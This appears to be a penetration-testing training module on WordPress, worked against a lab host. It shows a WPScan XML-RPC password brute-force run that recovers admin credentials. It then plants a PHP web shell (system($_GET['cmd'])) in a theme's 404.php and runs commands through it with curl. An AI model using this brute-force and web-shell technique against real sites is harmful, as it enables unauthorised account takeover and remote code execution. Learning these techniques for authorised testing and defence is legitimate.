## Table of Contents

- [WordPress User Bruteforce](#wordpress\user\bruteforce)
  - [WordPress User Bruteforce](#WordPress\User\Bruteforce)
      - [WPscan - XMLRPC](#WPscan\-\XMLRPC)
- [RCE via Theme Editor](#rce\via\theme\editor)
  - [Attacking the WordPress Backend](#Attacking\the\WordPress\Backend)
      - [Theme Editor](#Theme\Editor)
      - [Selecting Theme](#Selecting\Theme)
      - [Twenty Seventeen Theme - 404.php](#Twenty\Seventeen\Theme\-\404.php)
      - [RCE](#RCE)

# WordPress User Bruteforce
## WordPress User Bruteforce

WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website: `admin`, `roger`, and `david`. The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it is faster.

#### WPscan - XMLRPC

```shell
gdxqpardo@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/                                                  
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```



# RCE via Theme Editor
## Attacking the WordPress Backend
With admin access to WordPress, we can modify PHP source code to execute system commands. To perform this attack, log in to Wordpress with the administrator credentials, which should redirect us to the admin panel. Click on `Appearance` on the side panel and select `Them Editor`...


We should select an inactive theme in order to avoid corrupting the main theme.

#### Theme Editor

![image](https://academy.hackthebox.com/storage/modules/17/Theme-Editor.png)

We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.

#### Selecting Theme

![image](https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png)

Choose a theme and click on `Select`. Next, choose a non-critical file such as `404.php` to modify and add a web shell.

#### Twenty Seventeen Theme - 404.php

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

The above code should allow us to execute commands via the GET parameter `cmd`. In this example, we modified the source code of the `404.php` page and added a new function called `system()`. This function will allow us to directly execute operating system commands by sending a GET request and appending the `cmd` parameter to the end of the URL after a question mark `?` and specifying an operating system command. The modified URL should look like this `404.php?cmd=id`.

We can validate that we have achieved RCE by entering the URL into the web browser or issuing the `cURL` request below.

#### RCE

```shell
gdxqpardo@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

